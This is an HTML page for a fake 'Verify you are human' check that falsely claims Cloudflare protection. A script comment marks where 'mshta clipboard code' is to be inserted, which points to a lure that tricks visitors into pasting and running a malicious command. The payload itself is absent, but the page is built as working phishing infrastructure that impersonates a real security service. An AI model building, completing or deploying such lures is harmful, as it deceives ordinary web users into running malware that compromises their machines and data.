<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Check</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .card {
            background: white;
            border-radius: 32px;
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: #f3f4f6;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
        }
        h2 {
            font-size: 24px;
            margin-bottom: 12px;
            color: #1f2937;
        }
        p {
            color: #6b7280;
            font-size: 15px;
            margin-bottom: 28px;
            line-height: 1.5;
        }
        button {
            background: #f6821f;
            color: white;
            border: none;
            padding: 14px 28px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 50px;
            width: 100%;
            cursor: pointer;
            transition: transform 0.2s, background 0.2s;
        }
        button:active {
            transform: scale(0.97);
            background: #e06e0e;
        }
        .footer {
            margin-top: 24px;
            font-size: 12px;
            color: #9ca3af;
        }
        .spinner {
            display: none;
            margin: 20px auto 0;
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #f6821f;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @media (max-width: 480px) {
            .card {
                padding: 24px 20px;
            }
            h2 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🛡️</div>
        <h2>Verify you are human</h2>
        <p>Complete the verification below to continue</p>
        <button id="verifyBtn">Verify</button>
        <div class="spinner" id="spinner"></div>
        <div class="footer">Protected by Cloudflare</div>
    </div>

    <script>
        document.getElementById('verifyBtn').addEventListener('click', function() {
            var btn = this;
            var spinner = document.getElementById('spinner');
            btn.disabled = true;
            spinner.style.display = 'block';
            btn.innerText = 'Verifying...';
            
            // Add your mshta clipboard code here
            setTimeout(function() {
                spinner.style.display = 'none';
                btn.disabled = false;
                btn.innerText = 'Verify';
            }, 2000);
        });
    </script>
</body>
</html>
